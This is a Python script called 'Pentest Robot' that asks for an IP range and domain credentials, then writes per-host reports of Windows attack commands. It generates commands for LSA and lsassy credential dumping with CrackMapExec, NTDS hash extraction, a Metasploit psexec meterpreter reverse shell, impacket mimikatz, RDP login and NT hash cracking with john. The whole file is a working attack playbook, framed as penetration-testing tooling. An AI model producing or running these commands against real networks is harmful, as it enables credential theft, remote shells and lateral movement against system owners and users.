#!/usr/bin/python3

####################################################################################
#IMPORT MODULES SECTION
####################################################################################
# https://raw.githubusercontent.com/python/cpython/3.9/Lib/ipaddress.py
from ipaddress import ip_network
import subprocess
import os
####################################################################################

class UTILITIES:
    def __init__(self):
        """
        Class constructor
        """

    def seperator_line(self): return "################################################\n"
    
    def execute_command(self, cmd):
        """
        This function will execute a terminal window command
        """
        #declare the command output variable
        cmd_output = ""

        try:
            cmd_output = subprocess.check_output(cmd,
                                                 shell=True,
                                                 stderr=subprocess.STDOUT)
            cmd_output = cmd_output.decode("utf-8")
            cmd_output += "\n%s\n" % self.seperator_line()
        except Exception as e:
            print(str(e))
            print("Error cannot execute the cmd: %s" % cmd)
        finally:
            return cmd_output

#####################################################################################
#CORE FUNCTIONS TO SCAN AND ENUMERATE THE HOSTS
#####################################################################################
class ServiceDTO:
    """
    This ServiceDTO class will holds the objects values after an nmap scan
    """

    # Class Constructor
    def __init__(self, port, name, description):
        self.description = description
        self.port = port
        self.name = name


class HostScan:
    def __init__(self, host_ip):
        """
        Class constructor
        """
        self.host_ip = host_ip
        self.util = UTILITIES()

    def is_host_live(self):
        """
        Check if a host is up and running on the network
        """
        nmap_cmd = "nmap -sn %s" % self.host_ip
        nmap_output = self.util.execute_command(nmap_cmd)
        if ("1 host up" in nmap_output):
            print("[+] %s is up" % self.host_ip)
            return True
        else:
            return False

    def port_scan(self):
        """
        port scan a host, also add a version scan to get the information about the service.
        """
        print("[i] Starting Nmap port scan on host %s" % self.host_ip)
        nmap_cmd = "nmap -sV --open %s" % self.host_ip
        nmap_output = self.util.execute_command(nmap_cmd)
        return nmap_output

    def parse_nmap_output(self, nmap_output):
        """
        Parse the nmap results
        """
        service_names_list = {}
        nmap_output = nmap_output.split("\n")
        for output_line in nmap_output:
            output_line = output_line.strip()
            services_list = []
            # if port is open
            if ("tcp" in output_line) and (
                    "open"
                    in output_line) and not ("Discovered" in output_line):
                # cleanup the spaces
                while "  " in output_line:
                    output_line = output_line.replace("  ", " ")
                # Split the line
                output_line_split = output_line.split(" ")
                # The third part of the split is the service name
                service_name = output_line_split[2]
                # The first part of the split is the port number
                port_number = output_line_split[0]

                # Get the service description
                output_line_split_length = len(output_line_split)
                end_position = output_line_split_length - 1
                current_position = 3
                service_description = ''

                while current_position <= end_position:
                    service_description += ' ' + output_line_split[
                        current_position]
                    current_position += 1

                # Create the service Object
                service = ServiceDTO(port_number, service_name,
                                     service_description)
                # Make sure to add a new service if another one already exists on a different port number
                if service_name in service_names_list:
                    # Get the objects that are previously saved
                    services_list = service_names_list[service_name]

                services_list.append(service)
                print("[+] Port Open: %s, Service Name: %s" % (service.port, service.name))
                service_names_list[service_name] = services_list

        return service_names_list


class CreateTests:
    def __init__(self, host_ip, username, password, domain):
        """
        Class Constructor
        """
        #self.nmap_results = nmap_results
        self.host_ip = host_ip
        self.username = username
        self.password = password
        self.domain = domain
        self.util = UTILITIES()

    def start(self):
        """
        Start the enumeration process
        """
        output = ''
        
        # Generate tests
        output += self.cme_lsa() + self.util.seperator_line()
        output += self.smb_security() + self.util.seperator_line()
        output += self.meterpreter_shell() + self.util.seperator_line()
        output += self.gather_hashes() + self.util.seperator_line()
        output += self.mimikatz() + self.util.seperator_line()
        output += self.rdp() + self.util.seperator_line()
        output += self.crackpassword() + self.util.seperator_line()
            
        self.save_results(output, './reports', str(self.host_ip) + ".txt")

    def cme_lsa(self):
        """
        CrackMapExec LSA
        """
        cmd = 'crackmapexec smb {0} -u {1} -p {2} -d {3} --lsa\n'.format(self.host_ip, self.username, self.password, self.domain)
        cmd += 'crackmapexec smb {0} -u {1} -p {2} -d {3} -M lsassy\n'.format(self.host_ip, self.username, self.password, self.domain)

        #output = self.util.execute_command(cmd)
        return cmd

    def smb_security(self):
        """
        SMB Security Check
        """
        cmd = 'nmap -p 445 --script smb2-security-mode {0}\n'.format(self.host_ip)

        #output = self.util.execute_command(cmd)
        return cmd
    
    def meterpreter_shell(self):
        """
        Meterpreter Reverse Shell
        """
        cmd = 'use exploit/windows/smb/psexec \nset PAYLOAD windows/x64/meterpreter/reverse_tcp \nset LPORT 14568 \nset SMBDomain {0} \nset SMBUser {1} \nset SMBPass {2} \nset RHOST {3} \nset RPORT 445 \nexploit\n'.format(self.domain, self.username, self.password, self.host_ip)
        return cmd
    
    def mimikatz(self):
        """
        Mimikatz
        """
        cmd = 'impacket-mimikatz {0}/{1}:{2}@{3}\n'.format(self.domain,self.username,self.password,self.host_ip)

        #output = self.util.execute_command(cmd)
        return cmd
    
    def gather_hashes(self):
        """
        Gather Hashes
        """
        cmd = 'crackmapexec smb {0} -u {1} -p "'"{2}"'" --ntds drsuapi -d {3}\n'.format(self.host_ip, self.username, self.password, self.domain)
        cmd += 'cd ~/.cme/logs #-- output of hash dump goes here\n'

        #output = self.util.execute_command(cmd)
        return cmd    
    
    def rdp(self):
        """
        RDP Command
        """
        cmd = 'NOTE: you have to run this in Powershell, not linux bash!\n'
        cmd +='cmdkey /generic:{0} /user:{1} /pass:{2}\n'.format(self.host_ip, self.username, self.password)
        cmd +='mstsc /v:{0}\n'.format(self.host_ip)
        cmd +='cmdkey /delete:TERMSRV/{0}\n'.format(self.host_ip)

        return cmd

    def crackpassword(self):
        """
        John Cracking Password Command (assumes ~/words/passwords.txt dictionary)
        """
        cmd ='cd ~/words\n'
        cmd += './spray.sh -passupdate passwords.txt <COMPANY>\n'
        cmd += 'john --wordlist=passwords.txt hashes.txt --format=NT --rules=WordList\n'
        cmd += 'john --show hashes.txt --format=NT > cracked.txt\n'
        
        return cmd 
    def save_results(self, results, folder_name, file_name):
        """
        Save to a file
        """
        try:
            # Save the results to a folder/file
            file_name_path = folder_name + "/" + file_name

            # If the folder does not exist then create it
            if not os.path.isdir(folder_name):
                os.mkdir(folder_name)


            # If the contents are empty then exit this function
            if (len(results) == 0):
                return

            # Create the file object test
            file_to_save = open(file_name_path, 'w')
            # Write the changes
            file_to_save.write(results)
            # Close file object
            file_to_save.close()
        except:
            print("[!] Error: Cannot save the results to a file")


#####################################################################################
#APPLICATION LOAD MAIN FUNCTION
#####################################################################################

def validate_input(cidr_input):
    """
    Validate user input - IP Address CIDR format
    """
    hosts = []
    try:
        hosts = list(ip_network(cidr_input).hosts())
    except:
        print('Invalid input! A valid CIDR IP range example: 192.168.0.0/24')
        return None

    return hosts

if __name__ == '__main__':
    """
    This is where the application is first called
    """
    util = UTILITIES()

    # print Banner
    print("Welcome To Pentest Robot")
    print(util.seperator_line())
    print("Enter a single IP or Range in CIDR format (e.g. 192.168.0.0/24):")

    # user input, capture the username and password plus IP range
    cidr_input = input("IP/CIDR>")
    hosts = validate_input(cidr_input)
    print(util.seperator_line())

    print("Enter credential information (username, password, domain):")
    username = input("Username>")
    password = input("Password>")
    domain = input("Domain>")

    #if the CIDR value is valid
    if (hosts != None):
        print("\n[i] Creating the script...")
        LIVE_HOSTS = []
        for host in hosts:
            scanner = HostScan(host)
           # if (scanner.is_host_live()):
            LIVE_HOSTS.append(host)

        print("\n")
        #if we have live hosts
        if (len(LIVE_HOSTS) > 0):
            for live_host in LIVE_HOSTS:
                scanner_live_hosts = HostScan(live_host)
                #port_scan_results = scanner_live_hosts.port_scan()
                #parsed_nmap_results = scanner_live_hosts.parse_nmap_output(port_scan_results)
                enum = CreateTests(live_host, username, password, domain)
                enum.start()
                print(util.seperator_line())
        else:
            print("[!] No live hosts to scan")

    print ("\n[*] Finished The Script!")